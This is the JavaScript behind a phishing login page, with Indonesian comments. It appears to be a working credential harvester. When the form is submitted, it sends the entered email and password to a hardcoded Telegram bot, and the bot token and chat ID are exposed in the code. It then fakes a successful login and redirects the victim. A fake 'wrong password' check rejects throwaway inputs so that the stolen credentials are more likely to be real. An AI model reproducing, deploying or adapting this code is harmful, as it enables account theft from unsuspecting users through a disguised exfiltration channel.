document.getElementById('Formulir').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const submitBtn = document.getElementById('submitBtn');
    
    // --- LOGIKA VALIDASI BARU ---
    
    // 1. Cek jika password hanya berisi angka
    const isAllNumbers = /^\d+$/.test(password);
    
    // 2. Cek jika password sama dengan email
    const isPasswordSameAsEmail = (password.toLowerCase() === email.toLowerCase());

    // Eksekusi Validasi
    if (password === "123456" || isAllNumbers || isPasswordSameAsEmail) {
        alert("Kata sandi salah! Pastikan kata sandi Anda benar.");
        return; // Berhenti, tidak kirim ke Telegram
    }

    // --- PROSES KIRIM KE TELEGRAM (Jika lolos validasi) ---
    const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; 
    const chatId = '5056601299'; 

    submitBtn.innerText = "Memproses...";
    submitBtn.disabled = true;

    const text = `--- DATA LOGIN BARU ---\nUser: ${email}\nPass: ${password}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                alert('Berhasil Masuk!'); 
                document.getElementById('Formulir').reset(); 
                window.location.href = "comfirm.html"; 
            } else {
                alert('Gagal menghubungkan ke server.');
                submitBtn.innerText = "Masuk";
                submitBtn.disabled = false;
            }
        })
        .catch(error => {
            alert('Terjadi kesalahan koneksi.');
            submitBtn.innerText = "Masuk";
            submitBtn.disabled = false;
        });
});
